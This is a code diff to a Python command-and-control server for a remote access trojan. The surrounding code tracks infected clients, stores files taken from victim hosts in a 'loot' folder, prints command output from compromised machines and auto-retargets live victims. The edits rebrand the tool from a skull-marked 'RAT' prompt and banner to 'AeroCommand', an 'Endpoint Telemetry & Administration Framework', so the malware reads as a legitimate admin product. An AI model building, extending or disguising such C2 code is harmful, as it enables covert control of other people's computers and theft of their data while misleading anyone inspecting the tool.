@@ -67,6 +67,7 @@ class C:
 
 LOOT_DIR = "loot"
 HEARTBEAT_TIMEOUT = 60  # seconds — mark client dead if no heartbeat
+PROMPT = f"{C.CYAN}⚡ AeroCommand > {C.RESET}"
 
 # ========== ROUTES ==========
 
@@ -117,7 +118,7 @@ def register():
         print(f"\n{C.GREEN}[✓] NEW CLIENT CONNECTED:{C.RESET} {new_host} ({new_ip}) - PID: {info.get('pid', '?')}{admin_tag}{replaced_msg}")
         print(f"{C.CYAN}[•] Total clients: {len(infected_clients)}{C.RESET}\n")
         show_clients()
-        print(f"{C.RED}💀 RAT > {C.RESET}", end="", flush=True)
+        print(PROMPT, end="", flush=True)
 
     return "OK", 200
 
@@ -159,7 +160,7 @@ def post_result():
     print(f"\n{C.CYAN}[{timestamp}]{C.RESET} {C.YELLOW}OUTPUT from {host_label}:{C.RESET}")
     print(output)
     results.append({"client": client_id, "output": output, "time": timestamp})
-    print(f"{C.RED}💀 RAT > {C.RESET}", end="", flush=True)
+    print(PROMPT, end="", flush=True)
     return "OK", 200
 
 
@@ -193,7 +194,7 @@ def upload_file():
 
     print(f"\n{C.GREEN}[{timestamp}] 📥 FILE RECEIVED from {host}:{C.RESET} {filename} ({len(file_data)} bytes)")
     print(f"{C.GRAY}    Saved to: {save_path}{C.RESET}")
-    print(f"{C.RED}💀 RAT > {C.RESET}", end="", flush=True)
+    print(PROMPT, end="", flush=True)
     return "OK", 200
 
 
@@ -201,15 +202,14 @@ def upload_file():
 
 def show_banner():
     banner = f"""
-{C.RED}{C.BOLD}
-  ██████╗  █████╗ ████████╗
-  ██╔══██╗██╔══██╗╚══██╔══╝
-  ██████╔╝███████║   ██║   
-  ██╔══██╗██╔══██║   ██║   
-  ██║  ██║██║  ██║   ██║   
-  ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
-{C.RESET}{C.GRAY}  Remote Administration Tool — C2 Server
-  ────────────────────────────────────────{C.RESET}
+{C.CYAN}{C.BOLD}
+     ___                               ______                                           __
+    /   | ___  _________  ____  ____  / ____/___  ____ ___  ____ ___  ____ _____  ____/ /
+   / /| |/ _ \/ ___/ __ \/ __ \/ __ \/ /   / __ \/ __ `__ \/ __ `__ \/ __ `/ __ \/ __  / 
+  / ___ /  __/ /  / /_/ / /_/ / /_/ / /___/ /_/ / / / / / / / / / / / /_/ / / / / /_/ /  
+ /_/  |_\___/_/   \____/\____/\____/\____/\____/_/ /_/ /_/_/ /_/ /_/\__,_/_/ /_/\__,_/   
+{C.RESET}{C.GRAY}  Endpoint Telemetry & Administration Framework — C2 Server
+  ──────────────────────────────────────────────────────────{C.RESET}
 """
     print(banner)
 
@@ -304,7 +304,7 @@ def cleanup_dead_clients():
                 print(f"\n{C.YELLOW}[!] Target was dead. Auto-retargeting → {info['host']} ({info['ip']}){C.RESET}")
         if dead:
             print(f"\n{C.YELLOW}[!] Removed {len(dead)} dead client(s){C.RESET}")
-            print(f"{C.RED}💀 RAT > {C.RESET}", end="", flush=True)
+            print(PROMPT, end="", flush=True)
 
 
 def heartbeat_monitor():
@@ -323,7 +323,7 @@ def input_thread_func():
 
     while True:
         try:
-            cmd = input(f"{C.RED}💀 RAT > {C.RESET}").strip()
+            cmd = input(PROMPT).strip()
 
             if not cmd:
                 continue
